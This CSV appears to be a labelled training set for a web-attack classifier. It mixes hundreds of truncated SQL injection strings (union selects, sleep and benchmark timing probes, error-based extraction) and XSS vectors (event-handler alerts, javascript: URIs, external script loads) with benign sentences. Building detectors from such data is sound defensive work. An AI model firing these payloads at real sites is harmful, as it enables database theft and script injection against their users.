Payload,Label,text_label,ID
-1964' ) as ihsp where 6379 = 6379 or elt ( 6945 =,2,SQLi,16696
"<col draggable=""true"" ondrag=""alert(1)"">test</col>",1,XSS,3290
"<IMG SRC=x onkeypress=""alert(String.fromCharCode(8",1,XSS,1196
Up to 40% off Select Edible Spring Gardening and H,0,normal,25211
<svg><xss onload=alert(1)></xss>,1,XSS,7454
`'><script>\xEF\xBF\xAEjavascript:alert(1)</script,1,XSS,581
<svg><spacer onload=alert(1)></spacer>,1,XSS,1925
Save up to 30% on select solar panels and electric,0,normal,25716
"{""id"":null,""firstName"":""Audrey"",""lastName"":""Hee"",""",0,normal,27498
<data onpointerout=alert(1)>XSS</data>,1,XSS,3070
"<iframe src=""http://www.example.org/dropHere.html""",1,XSS,9195
"1%"" ) ) ) and 3580 = ( select count ( * ) from dom",2,SQLi,14224
<optgroup id=x tabindex=1 onactivate=alert(1)></op,1,XSS,7787
( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) |,2,SQLi,12645
"1"" ) and row ( 6237,7469 ) > ( select count ( * ) ",2,SQLi,16437
"The speaker, instead of deciding the question, sub",0,normal,25371
"<aside onmousedown=""alert(1)"">test</aside>",1,XSS,5674
"1 or 6979 = like ( 'abcdefg',upper ( hex ( randomb",2,SQLi,20452
1' ) as juxt where 5956 = 5956 and 8148 = like ( ',2,SQLi,21734
javascript:alert()//--></script></textarea></style,1,XSS,9547
"-6554' ) ) ) union all select 4384,4384,4384,4384,",2,SQLi,14968
1'+ ( select ijoh where 7145 = 7145 order by 1--,2,SQLi,13573
<multicol onpointerenter=alert(1)>XSS</multicol>,1,XSS,6629
"1' ) ) ) and 4241 = convert ( int, ( select char (",2,SQLi,19378
"-7824"" ) ) ) union all select 3800,3800,3800,3800,",2,SQLi,15057
"<script a="">"" '' SRC=""http://www.securitycompass.c",1,XSS,1557
<legend id=x tabindex=1 ondeactivate=alert(1)></le,1,XSS,1793
Men's tennis is no longer ruled by a select few.,0,normal,25880
1'+ ( select dklk where 9862 = 9862 union all sele,2,SQLi,12718
<xss id=x tabindex=1 onblur=alert(1)></xss><input ,1,XSS,6756
alert(1)//,1,XSS,9445
1' ) ) ) and 4386 = utl_inaddr.get_host_address ( ,2,SQLi,12279
Select choose.,0,normal,24563
"1%"" procedure analyse ( extractvalue ( 5840,concat",2,SQLi,20194
&lt;!--[if gte IE 4]&gt;,1,XSS,1418
Select your tournament.,0,normal,24926
<audio onpointerdown=alert(1)>XSS</audio>,1,XSS,2180
#ERROR!,2,SQLi,10962
"1 union all select null,null,null,null,null,null,n",2,SQLi,13303
"<abbr draggable=""true"" ondragend=""alert(1)"">test</",1,XSS,3623
1 where 6518 = 6518,2,SQLi,21772
"<s onkeyup=""alert(1)"" contenteditable>test</s>",1,XSS,5643
1'+ ( select ggah where 3263 = 3263 and 6240 = ( ',2,SQLi,17697
<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><,1,XSS,7892
She'll select her dress.,0,normal,24318
&#x00003c;,1,XSS,1080
"1"" ) and make_set ( 4539 = 6401,6401 ) and ( ""kglx",2,SQLi,14316
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10424
Select the best tools for the project.,0,normal,24213
<image2 onpointerenter=alert(1)>XSS</image2>,1,XSS,8428
"1' where 8083 = 8083 and updatexml ( 3393,concat (",2,SQLi,18253
Select a paint color for the room.,0,normal,24219
Mary and the Witch's Flower is out now in select t,0,normal,25889
"1%"" ) ) ) union all select null--",2,SQLi,20500
"1"" ) as lkzz where 3565 = 3565 and char ( 120 ) ||",2,SQLi,14009
"1 where 9898 = 9898 and 4241 = convert ( int, ( se",2,SQLi,21660
1'+ ( select 'leok' where 4320 = 4320,2,SQLi,13560
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6140
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,15841
<embed src=javascript:alert(1)>,1,XSS,9168
"1%"" ) or 8384 = like ( 'abcdefg',upper ( hex ( ran",2,SQLi,14948
"1"" ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( ",2,SQLi,15887
1'|| ( select 'cozi' from dual where 2607 = 2607 a,2,SQLi,15959
"<![><img src=""]><img src=x onerror=alert(XSS)//"">",1,XSS,960
1 ) as zdym where 1578 = 1578 union all select nul,2,SQLi,19361
<col onpointerover=alert(1)>XSS</col>,1,XSS,8259
Democrats will select their nominee for speaker th,0,normal,26245
The county voters were the freeholders; but in the,0,normal,25465
`'><script>\x0Ajavascript:alert(1)</script>,1,XSS,574
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,14822
<label id=x tabindex=1 onbeforedeactivate=alert(1),1,XSS,5185
<sub onblur=alert(1) tabindex=1 id=x></sub><input ,1,XSS,6875
1 ) as jqbv where 8172 = 8172 and 8148 = like ( 'a,2,SQLi,22221
"-1512"" union all select 9688,9688,9688,9688,9688,9",2,SQLi,18005
<label id=x tabindex=1 ondeactivate=alert(1)></lab,1,XSS,6651
1' ) ) as popm where 6594 = 6594 union all select ,2,SQLi,15783
<video onpointerenter=alert(1)>XSS</video>,1,XSS,2866
<button onBlur=javascript:alert(1)>,1,XSS,9589
"Select Policies, and then select the policy you wa",0,normal,25614
"-3102 ) union all select 6707,6707,6707,6707--",2,SQLi,18485
"<col draggable=""true"" ondragleave=""alert(1)"">test<",1,XSS,6506
"{""id"":null,""firstName"":""Vanessa"",""lastName"":""Liew""",0,normal,26918
"-4543"" ) or 3038 = 3038",2,SQLi,16025
<iframe onpointermove=alert(1)>XSS</iframe>,1,XSS,7611
"<isindex onmouseleave=""alert(1)"">test</isindex>",1,XSS,8129
"1"" ) ) ) or 8421 = ( select count ( * ) from gener",2,SQLi,18712
then,0,normal,23146
"<element draggable=""true"" ondragleave=""alert(1)"">t",1,XSS,2616
<blink onpointermove=alert(1)>XSS</blink>,1,XSS,8249
<input2 onpointerleave=alert(1)>XSS</input2>,1,XSS,2301
"<style>@keyframes slidein {}</style><span style=""a",1,XSS,3525
1 ) where 5073 = 5073 and char ( 107 ) ||char ( 12,2,SQLi,19103
"<hr onmouseleave=""alert(1)"">test</hr>",1,XSS,8296
1 ) or 8156 = ( select count ( * ) from generate_s,2,SQLi,18350
<head onpointerleave=alert(1)>XSS</head>,1,XSS,7250
"<img src=x\x11onerror=""javascript:alert(1)"">",1,XSS,674
1%' ) ) and 6969 = ( select 6969 from pg_sleep ( 5,2,SQLi,21461
"-1487"" ) as crfi where 2407 = 2407 union all selec",2,SQLi,17411
Select the next travel destination.,0,normal,24168
Select shoot.,0,normal,24666
It opens in select cities today and stars Helen Mi,0,normal,25959
<slot onpointermove=alert(1)>XSS</slot>,1,XSS,2212
"<;FRAMESET>;<;FRAME SRC="";javascript:alert(';XSS';",1,XSS,1590
"1' where 9003 = 9003 and make_set ( 5868 = 8316,83",2,SQLi,14590
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#,1,XSS,1696
1%' and exp ( ~ ( select * from ( select concat ( ,2,SQLi,19745
1'|| ( select 'ylek' where 3803 = 3803 and 4241 = ,2,SQLi,20582
<canvas onpointerout=alert(1)>XSS</canvas>,1,XSS,4040
"{""id"":null,""name"":""soldier sky""}",0,normal,27158
"-2044%' ) ) or elt ( 9299 = 3618,3618 ) and ( ( '%",2,SQLi,13102
select * from users where id = '1' union select \.,2,SQLi,11920
<fieldset onpointerup=alert(1)>XSS</fieldset>,1,XSS,7231
"admin"" --",2,SQLi,9923
select ( case when ( 8857 = 1512 ) then 8857 else ,2,SQLi,18808
"`""'><img src=xxx:x \x2Fonerror=javascript:alert(1)",1,XSS,550
"{""id"":null,""firstName"":""Haryati"",""lastName"":""Kamis",0,normal,26756
"<frameset oncontextmenu=""alert(1)"">test</frameset>",1,XSS,7200
<bgsound onPropertyChange bgsound onPropertyChange,1,XSS,383
<svg><acronym onload=alert(1)></acronym>,1,XSS,8760
<button onKeyDown=javascript:alert(1)>,1,XSS,9622
1' ) ) ) and 7401 = 9838#,2,SQLi,19087
"<bdi onmouseleave=""alert(1)"">test</bdi>",1,XSS,4220
-4057' ) order by 1#,2,SQLi,13747
select * from users where id = '1' or $ . = 1 unio,2,SQLi,11525
"<keygen draggable=""true"" ondragend=""alert(1)"">test",1,XSS,4227
"or benchmark(50000000,MD5(1))",2,SQLi,10388
1' ) ) and 7533 = 7533 and ( ( 'gvoh' = 'gvoh,2,SQLi,19330
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMA",2,SQLi,10660
Select track.,0,normal,24661
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMA",2,SQLi,10667
1' ) or 8421 = ( select count ( * ) from generate_,2,SQLi,21861
"-5637%"" ) ) ) or 6872 = 6872 and ( ( ( ""%"" = """,2,SQLi,13858
Select carry.,0,normal,24752
"1"" ) where 6255 = 6255 and extractvalue ( 7982,con",2,SQLi,21127
-1676'|| ( select 'xzmu' from dual where 6373 = 63,2,SQLi,14923
1' ) where 6387 = 6387 and 6510 = ( select count (,2,SQLi,19742
"1%"" ) and elt ( 4249 = 4249,7259 ) and ( ""%"" = """,2,SQLi,21148
"-3733' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( c",2,SQLi,18041
"<header oncopy=""alert(1)"" contenteditable>test</he",1,XSS,3522
<style>:target {transform: rotate(180deg);}</style,1,XSS,8303
<address onpointermove=alert(1)>XSS</address>,1,XSS,2385
Select the right filter for the photo.,0,normal,24222
Select your dream team.,0,normal,24334
Select fly.,0,normal,24648
"select * from generate_series ( 3551,3551,case whe",2,SQLi,18498
<dir onpointerleave=alert(1)>XSS</dir>,1,XSS,5957
Select a hairstyle for a new appearance.,0,normal,24088
><script+src=https://www.googleadservices.com/page,1,XSS,9777
1 where 7412 = 7412 and 6414 = ( select count ( * ,2,SQLi,17314
I'll select a gift for my cousin's birthday.,0,normal,23704
I want to select the perfect song for the occasion,0,normal,23709
"<tr onkeypress=""alert(1)"" contenteditable>test</tr",1,XSS,5596
"1 and ( select 9067 from ( select count ( * ) ,con",2,SQLi,16591
"1"" and elt ( 4249 = 4249,7259 )",2,SQLi,14617
1 ) or 1022 = ( select count ( * ) from all_users ,2,SQLi,19878
<script>alert(1337)</script><marquee><h1>XSS by xs,1,XSS,1348
"<table onclick=""alert(1)"">test</table>",1,XSS,8469
AND 1 = utl_inaddr.get_host_address ( ( SELECT DIS,2,SQLi,11891
Where's the missing link?,0,normal,22708
) or ( 'x' ) = ( 'x,2,SQLi,11893
"1"" ) ) ) rlike ( select * from ( select ( sleep ( ",2,SQLi,15321
"<dl onkeypress=""alert(1)"" contenteditable>test</dl",1,XSS,7911
"javascript:alert()""//</title></textarea></style></",1,XSS,9507
"1' ) or ( select 9173 from ( select count ( * ) ,c",2,SQLi,19670
1'|| ( select 'wszt' from dual where 6854 = 6854 a,2,SQLi,16933
"1' or 6979 = like ( 'abcdefg',upper ( hex ( random",2,SQLi,17897
<textarea onbeforepaste=alert(1) autofocus></texta,1,XSS,7328
<tr onpointerover=alert(1)>XSS</tr>,1,XSS,5481
Fetch information where required.,0,normal,23360
"<listing onclick=""alert(1)"">test</listing>",1,XSS,3562
<bdi id=x tabindex=1 onactivate=alert(1)></bdi>,1,XSS,7105
<keygen autofocus onfocus=alert(1)>,1,XSS,8463
"""Select artwork"" will allow you to choose from sto",0,normal,26454
1' in boolean mode ) or 9643 = ( select count ( * ,2,SQLi,17591
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10735
"-7940%"" ) union all select 2779,2779,2779,2779,277",2,SQLi,20229
<b id=x tabindex=1 onbeforedeactivate=alert(1)></b,1,XSS,6653
"Click ""Day"" view and select the calendars you want",0,normal,26282
"1"" ) and 3580 = ( select count ( * ) from domain.d",2,SQLi,19280
1' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||ch,2,SQLi,13041
if ( 6647 = 2179 ) select 6647 else drop function ,2,SQLi,17123
-2418'|| ( select 'mdbt' from dual where 3026 = 30,2,SQLi,16617
1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6,2,SQLi,20908
"-1401"" ) ) union all select 3480,3480,3480,3480,34",2,SQLi,21113
"{""id"":null,""name"":""Indochinese Tiger""}",0,normal,27267
AS INJECTX WHERE 1=1 AND 1=0,2,SQLi,10232
1' ) where 2511 = 2511 and 2853 = cast ( ( chr ( 1,2,SQLi,20904
"{""id"":null,""firstName"":""Meena"",""lastName"":""Melanie",0,normal,27070
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,20785
select,0,normal,26551
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,20762
select pg_sleep ( 5 ) ) ||',2,SQLi,15669
"-8976%"" ) ) ) union all select 5146,5146,5146,5146",2,SQLi,18399
"<style>@keyframes x{}</style><template style=""anim",1,XSS,5719
-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A)),2,SQLi,11147
"<rt oncut=""alert(1)"" contenteditable>test</rt>",1,XSS,6372
1' ) where 2120 = 2120,2,SQLi,16207
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,19369
1' or 1022 = ( select count ( * ) from all_users t,2,SQLi,21058
"<col draggable=""true"" ondragenter=""alert(1)"">test<",1,XSS,1740
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10815
1' in boolean mode ) rlike ( select ( case when ( ,2,SQLi,20432
"1"" where 6281 = 6281 or 7552 = ( select count ( * ",2,SQLi,21801
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,6732
"<multicol onmousedown=""alert(1)"">test</multicol>",1,XSS,8254
"<param onbeforecopy=""alert(1)"" contenteditable>tes",1,XSS,2076
Delete duplicates.,0,normal,22808
""" or benchmark(10000000,MD5(1))#",2,SQLi,10844
"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",2,SQLi,10871
"<main onkeyup=""alert(1)"" contenteditable>test</mai",1,XSS,3391
"select * from users where id = 1 or "", ( "" or 1 = ",2,SQLi,11500
Update the website content.,0,normal,22670
><script+src=https://api-metrika.yandex.ru/managem,1,XSS,9782
"<script src=""http://code.jquery.com/jquery-1.4.4.j",1,XSS,9256
"1"" ) as frmp where 6073 = 6073",2,SQLi,15418
<select onpointerleave=alert(1)>XSS</select>,1,XSS,6660
<button onPopState=javascript:alert(1)>,1,XSS,9647
<canvas onpointerover=alert(1)>XSS</canvas>,1,XSS,2999
1%' ) or 4915 = ( select count ( * ) from domain.d,2,SQLi,20292
In ordinary times the president may be almost comp,0,normal,26003
<style>:target {color: red;}</style><base id=x sty,1,XSS,6942
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6189
Quickly select items.,0,normal,24790
"And even if they made one error, they select them.",0,normal,26367
"1"" ) or 5356 = ( select count ( * ) from sysusers ",2,SQLi,20294
"select * from users where id = 1 or "",;"" or 1 = 1 ",2,SQLi,11419
"<col onpaste=""alert(1)"" contenteditable>test</col>",1,XSS,7694
<svg><path><animateMotion onend=alert(1) dur=1s re,1,XSS,5328
"<a href=""\xE2\x81\x9Fjavascript:javascript:alert(1",1,XSS,539
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,7359
admin') or '1'='1'/*,2,SQLi,9921
ÃÂ½ or 1=1 --,2,SQLi,10157
1' ) ) and 4386 = utl_inaddr.get_host_address ( ch,2,SQLi,16976
Retrieve info where necessary.,0,normal,23453
Where's the nearest ATM?,0,normal,23490
1 ) where 2390 = 2390,2,SQLi,13902
<style>:target {color:red;}</style><header id=x st,1,XSS,2607
1' ) as xqbq where 1619 = 1619 and 6240 = ( 'qqpjq,2,SQLi,21868
1 ) as skby where 4269 = 4269 or elt ( 6272 = 6272,2,SQLi,15294
1'|| ( select 'bupa' from dual where 8548 = 8548,2,SQLi,17582
Select with confidence.,0,normal,24430
1 where 2823 = 2823 and 3707 = ( select count ( * ,2,SQLi,13623
1 ) ) as dnwj where 2961 = 2961 and char ( 111 ) |,2,SQLi,14186
Select resume.,0,normal,24589
"<title oncopy=""alert(1)"" contenteditable>test</tit",1,XSS,6535
"<font onmousemove=""alert(1)"">test</font>",1,XSS,2658
"1 ) where 1513 = 1513 and 8148 = like ( 'abcdefg',",2,SQLi,13411
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,13372
"<frameset onScroll frameset onScroll=""javascript:j",1,XSS,374
Select your size.,0,normal,24804
uni/**/on sel/**/ect,2,SQLi,10161
"<dt ondblclick=""alert(1)"">test</dt>",1,XSS,8301
"1%"" ) ) ) or ( select * from ( select ( sleep ( 5 ",2,SQLi,16969
Take 30 percent off select styles with code: PRES3,0,normal,25510
1 ) ) or 7417 = ( select count ( * ) from sysibm.s,2,SQLi,17209
"-9638 ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ",2,SQLi,20750
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10466
"<;EMBED SRC="";http://ha.ckers.org/xss.swf""; AllowS",1,XSS,1610
1' ) ) ) and 6414 = ( select count ( * ) from rdb$,2,SQLi,14930
)) or pg_sleep(5)--,2,SQLi,10371
select ( case when ( 7594 = 8086 ) then 7594 else ,2,SQLi,19384
Select your struggle.,0,normal,24918
Select carefully.,0,normal,24480
select ( case when ( 8916 = 1357 ) then 8916 else ,2,SQLi,17994
<canvas id=x tabindex=1 onactivate=alert(1)></canv,1,XSS,7156
"1%"" ) ) ) and 6510 = ( select count ( * ) from sys",2,SQLi,20289
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,16194
"<style>@keyframes x{}</style><noembed style=""anima",1,XSS,4588
The products are available at select Target locati,0,normal,25386
"1"" ) as rovd where 3764 = 3764 and elt ( 4249 = 42",2,SQLi,12862
"-1254"" or 4144 = ( select upper ( xmltype ( chr ( ",2,SQLi,21997
"<IMG SRC=x onseeking=""alert(String.fromCharCode(88",1,XSS,1234
"<aside onkeyup=""alert(1)"" contenteditable>test</as",1,XSS,8882
<var onpointermove=alert(1)>XSS</var>,1,XSS,2618
"{""id"":null,""name"":""Snover""}",0,normal,26864
"1"" ) as kdvb where 2651 = 2651 and 6240 = ( 'qqpjq",2,SQLi,15637
Where's the mountain cabin?,0,normal,23556
<style>:target {color:red;}</style><select id=x st,1,XSS,6501
"1%' union all select null,null,null#",2,SQLi,12684
"<em draggable=""true"" ondragend=""alert(1)"">test</em",1,XSS,5655
1 ) or 9643 = ( select count ( * ) from domain.dom,2,SQLi,15973
"-4993"" union all select 6959,6959,6959--",2,SQLi,19618
"<script draggable=""true"" ondragenter=""alert(1)"">te",1,XSS,6833
",''),/*test*/%26%26%09sLeEp(5)%09--+",2,SQLi,11155
1' or 8315 = ( select count ( * ) from sysibm.syst,2,SQLi,14667
"-1351"" where 6968 = 6968 or 5684 = 8582",2,SQLi,13551
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10787
top[âalâ+âertâ](1),1,XSS,4155
<option id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,4119
"1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ",2,SQLi,22460
"<span onkeypress=""alert(1)"" contenteditable>test</",1,XSS,4341
"<basefont oncopy=""alert(1)"" contenteditable>test</",1,XSS,6207
<image onpointerdown=alert(1)>XSS</image>,1,XSS,8288
<hgroup onpointerenter=alert(1)>XSS</hgroup>,1,XSS,5253
Let's find out where the local festival is.,0,normal,23944
1 ) ) and 8312 = dbms_pipe.receive_message ( chr (,2,SQLi,15717
<fieldset onpointermove=alert(1)>XSS</fieldset>,1,XSS,5094
"-3666"" ) ) ) union all select 4136,4136,4136--",2,SQLi,14423
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2591
Where's the skincare clinic?,0,normal,23644
I'm thinking of where to have our picnic.,0,normal,23974
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;o,1,XSS,985
<spacer onpointerenter=alert(1)>XSS</spacer>,1,XSS,4142
"1%' ) ) ) procedure analyse ( extractvalue ( 9627,",2,SQLi,18505
"<samp onkeyup=""alert(1)"" contenteditable>test</sam",1,XSS,2696
1 ) ) or exp ( ~ ( select * from ( select concat (,2,SQLi,18810
You can select multiple photos on your iPhone at o,0,normal,25079
Where did you discover that inspiring story from?,0,normal,23754
"[a]('javascript:alert(""1"")')",1,XSS,9437
or '1' = '1,2,SQLi,11647
1 ) ) as tbiq where 7159 = 7159 and 8635 = ( selec,2,SQLi,16002
"1"" where 6325 = 6325 union all select null,null,nu",2,SQLi,22136
1 where 3502 = 3502 order by 1--,2,SQLi,15910
Where's the art show?,0,normal,23580
Check conditions where necessary.,0,normal,23332
`'><script>\x0Bjavascript:alert(535)</script>,1,XSS,8968
"select * from users where id = 1 or ""1;"" = 1 or 1 ",2,SQLi,12053
1' ) ) and ( select 2* ( if ( ( select * from ( se,2,SQLi,18637
<dd onfocusout=alert(1) tabindex=1 id=x></dd><inpu,1,XSS,8490
"1"" ) ) as nwnp where 6140 = 6140",2,SQLi,14095
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaa,1,XSS,336
Select lunch.,0,normal,24501
"-2312' ) ) ) union all select 5282,5282,5282,5282,",2,SQLi,12150
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5557
"1 where 2146 = 2146 or 8384 = like ( 'abcdefg',upp",2,SQLi,20984
Group data where relevant.,0,normal,23470
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4976
//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,1,XSS,1357
"admin"" or 1 = 1--",2,SQLi,11879
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\",1,XSS,258
"<bdi oncut=""alert(1)"" contenteditable>test</bdi>",1,XSS,5708
Select your conflict.,0,normal,24913
<address id=x tabindex=1 onfocus=alert(1)></addres,1,XSS,4566
"1"" ) where 5850 = 5850 or updatexml ( 1808,concat ",2,SQLi,17626
1 ) ) as rwsn where 9946 = 9946 or extractvalue ( ,2,SQLi,22482
-4289' or 2724 in ( ( char ( 113 ) +char ( 113 ) +,2,SQLi,17425
"<datalist draggable=""true"" ondragend=""alert(1)"">te",1,XSS,7861
"<IMG SRC=javascript:alert(String.fromCharCode(88,8",1,XSS,246
1 and 2716 = ( select count ( * ) from sysusers as,2,SQLi,13423
"1"" and 4241 = convert ( int, ( select char ( 113 )",2,SQLi,17732
"<small onkeyup=""alert(1)"" contenteditable>test</sm",1,XSS,7513
"<strike oncontextmenu=""alert(1)"">test</strike>",1,XSS,3171
"<progress onkeyup=""alert(1)"" contenteditable>test<",1,XSS,5374
"<base draggable=""true"" ondragenter=""alert(1)"">test",1,XSS,4621
1 ) or ( select * from ( select ( sleep ( 5 ) ) ) ,2,SQLi,18724
1 ) ) as fmpr where 3103 = 3103 and elt ( 9970 = 9,2,SQLi,15723
<form action=javascript:alert(1)><input type=submi,1,XSS,161
"<address draggable=""true"" ondragleave=""alert(1)"">t",1,XSS,6681
<tr id=x tabindex=1 onactivate=alert(1)></tr>,1,XSS,2211
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10824
"<TD BACKGROUND=""javascript:alert('XSS')"">",1,XSS,1364
<source onpointerenter=alert(1)>XSS</source>,1,XSS,2300
"1"" ) where 4971 = 4971 and 3824 = benchmark ( 5000",2,SQLi,19122
<body onpointerout=alert(1)>XSS</body>,1,XSS,5282
"{""id"":null,""firstName"":""Kok Heng"",""lastName"":""Tan""",0,normal,27606
1' ) or 5286 = ( select count ( * ) from all_users,2,SQLi,18396
<audio onpointermove=alert(1)>XSS</audio>,1,XSS,1806
"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706",2,SQLi,19951
1' ) as jiic where 6158 = 6158 or ( select 2* ( if,2,SQLi,19490
<listing id=x tabindex=1 onbeforeactivate=alert(1),1,XSS,5690
"<table onmouseup=""alert(1)"">test</table>",1,XSS,6879
floor,0,normal,23209
<bdi onpointerout=alert(1)>XSS</bdi>,1,XSS,4087
<body onbeforeunload=navigator.sendBeacon('//https,1,XSS,8
<data onpointerdown=alert(1)>XSS</data>,1,XSS,3186
<custom tags onpointerenter=alert(1)>XSS</custom t,1,XSS,5385
"( select count ( * ) from rdb$fields as t1,rdb$typ",2,SQLi,19402
"1"" ) as ifgl where 2190 = 2190 rlike ( select ( ca",2,SQLi,21995
"-9011"" ) ) or 1 group by concat ( 0x7171706a71, ( ",2,SQLi,12260
<style>@keyframes slidein {}</style><keygen style=,1,XSS,7735
1' ) where 5280 = 5280 and 4595 = 4595#,2,SQLi,15571
<style>:target {transform: rotate(180deg);}</style,1,XSS,8148
select ( case when ( 3677 = 2193 ) then 3677 else ,2,SQLi,20757
1'+ ( select 'suzs' where 2905 = 2905 and 4241 = c,2,SQLi,21352
"<ol ondblclick=""alert(1)"">test</ol>",1,XSS,6260
`'><script>\x7Ejavascript:alert(1)</script>,1,XSS,576
1%' ) rlike ( select ( case when ( 7689 = 7689 ) t,2,SQLi,19400
"1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex (",2,SQLi,20667
"<bgsound onmouseout=""alert(1)"">test</bgsound>",1,XSS,7743
1' ) and exp ( ~ ( select * from ( select concat (,2,SQLi,15438
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,4077
1 ) ) and exp ( ~ ( select * from ( select concat ,2,SQLi,17872
"1"" ) where 7228 = 7228",2,SQLi,18998
Show me where it's located.,0,normal,23277
1 ) and ( 3020 = 3020 ) *6703 and ( 9831 = 9831,2,SQLi,13433
"<xmp onmouseenter=""alert(1)"">test</xmp>",1,XSS,4427
"-8673"" ) or make_set ( 9354 = 9354,7185 ) and ( ""e",2,SQLi,17869
Select the best filter for the photo.,0,normal,24012
"-6431"" ) ) union all select 2358,2358,2358,2358,23",2,SQLi,19519
<th id=x tabindex=1 onbeforeactivate=alert(1)></th,1,XSS,1907
Select your ask.,0,normal,24965
"<style>@keyframes slidein {}</style><rt style=""ani",1,XSS,2638
"1%"" ) ) ) and 9660 = ( select count ( * ) from all",2,SQLi,18147
"-8040"" ) ) ) or make_set ( 3916 = 6787,6787 ) and ",2,SQLi,17199
"-5424' ) ) union all select 8231,8231,8231,8231,82",2,SQLi,19189
"admin"") or (""1""=""1",2,SQLi,9935
Identify columns where relevant.,0,normal,23249
"1%' ) ) ) union all select null,null,null,null#",2,SQLi,12403
1' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ),2,SQLi,20065
[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&,1,XSS,9415
"-4635"" union all select 5087,5087,5087,5087,5087,5",2,SQLi,15439
"<blockquote onmouseover=""alert(1)"">test</blockquot",1,XSS,2288
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,15194
"1"" ) ) as ycvh where 4523 = 4523 and sleep ( 5 ) #",2,SQLi,19137
"AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337",2,SQLi,11288
"<style>@keyframes x{}</style><blink style=""animati",1,XSS,3683
<video autoplay onloadedmetadata=alert(1)> <source,1,XSS,4924
word1,0,normal,26533
"1"" ) ) or 4411 = ( select count ( * ) from sysuser",2,SQLi,19061
1' ) as ubvf where 5923 = 5923 and 8490 = 4925--,2,SQLi,16444
"<style>@keyframes x{}</style><base style=""animatio",1,XSS,7631
"<applet onkeypress=""alert(1)"" contenteditable>test",1,XSS,2827
Create a new playlist.,0,normal,22613
"or benchmark ( 10000000,MD5 ( 1 ) ) #",2,SQLi,12082
1%' and sleep ( 5 ) and '%' = ',2,SQLi,16833
1'+ ( select wpai where 3685 = 3685,2,SQLi,13584
